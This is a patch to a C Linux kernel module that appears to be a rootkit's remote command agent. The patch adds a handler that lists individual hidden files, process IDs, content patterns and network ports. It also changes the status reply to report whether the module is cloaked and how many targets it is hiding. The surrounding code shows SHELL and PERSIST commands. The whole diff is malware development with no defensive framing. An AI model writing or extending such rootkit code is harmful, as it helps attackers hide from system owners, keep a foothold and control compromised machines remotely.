@@ -77,6 +77,32 @@ static int rk_agent_reply(struct rk_agent *agent, struct socket *socket,
 	return error;
 }
 
+static int rk_agent_list(struct rk_agent *agent, struct socket *socket,
+			  struct rk_target_list *list,
+			  const struct rk_command *command)
+{
+	unsigned char reply[RK_FRAME_MAX];
+	size_t reply_length;
+	unsigned long flags;
+
+	if (!command->list_has_index) {
+		reply_length = scnprintf(reply, sizeof(reply), "LIST %u",
+					 list->count);
+		return rk_agent_reply(agent, socket, reply, reply_length);
+	}
+	spin_lock_irqsave(&list->lock, flags);
+	if (command->list_index >= list->count) {
+		spin_unlock_irqrestore(&list->lock, flags);
+		return rk_agent_reply(agent, socket,
+				      (const unsigned char *)"ERR index", 9);
+	}
+	reply_length = scnprintf(reply, sizeof(reply), "ENTRY %u %s",
+				 command->list_index,
+				 list->entries[command->list_index]);
+	spin_unlock_irqrestore(&list->lock, flags);
+	return rk_agent_reply(agent, socket, reply, reply_length);
+}
+
 static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 			    const unsigned char *payload, size_t payload_length,
 			    bool *close_session)
@@ -111,14 +137,21 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 	case RK_COMMAND_INFO:
 		return rk_agent_reply(agent, socket, info_reply,
 				      sizeof(info_reply) - 1);
-	case RK_COMMAND_STATUS:
+	case RK_COMMAND_STATUS: {
+		extern bool cloaked;
+
 		mutex_lock(&agent->lock);
 		reply_length = scnprintf(reply, sizeof(reply),
-					 "STATUS connected=%s attempts=%llu",
-					 agent->connected ? "true" : "false",
-					 agent->connections);
+					 "STATUS hidden=%s files=%u pids=%u "
+					 "content=%u ports=%u",
+					 cloaked ? "yes" : "no",
+					 file_targets.count,
+					 pid_targets.count,
+					 content_targets.count,
+					 port_targets.count);
 		mutex_unlock(&agent->lock);
 		return rk_agent_reply(agent, socket, reply, reply_length);
+	}
 	case RK_COMMAND_SHELL:
 		mutex_lock(&agent->lock);
 		if (!agent->shell_enabled) {
@@ -226,21 +259,13 @@ static int rk_agent_command(struct rk_agent *agent, struct socket *socket,
 		reply_length = scnprintf(reply, sizeof(reply), "OK");
 		return rk_agent_reply(agent, socket, reply, reply_length);
 	case RK_COMMAND_LIST_FILE:
-		reply_length = scnprintf(reply, sizeof(reply), "LIST %u",
-					 file_targets.count);
-		return rk_agent_reply(agent, socket, reply, reply_length);
+		return rk_agent_list(agent, socket, &file_targets, &command);
 	case RK_COMMAND_LIST_PID:
-		reply_length = scnprintf(reply, sizeof(reply), "LIST %u",
-					 pid_targets.count);
-		return rk_agent_reply(agent, socket, reply, reply_length);
+		return rk_agent_list(agent, socket, &pid_targets, &command);
 	case RK_COMMAND_LIST_CONTENT:
-		reply_length = scnprintf(reply, sizeof(reply), "LIST %u",
-					 content_targets.count);
-		return rk_agent_reply(agent, socket, reply, reply_length);
+		return rk_agent_list(agent, socket, &content_targets, &command);
 	case RK_COMMAND_LIST_PORT:
-		reply_length = scnprintf(reply, sizeof(reply), "LIST %u",
-					 port_targets.count);
-		return rk_agent_reply(agent, socket, reply, reply_length);
+		return rk_agent_list(agent, socket, &port_targets, &command);
 	case RK_COMMAND_PERSIST:
 		return rk_agent_reply(agent, socket,
 				      (const unsigned char *)"OK", 2);
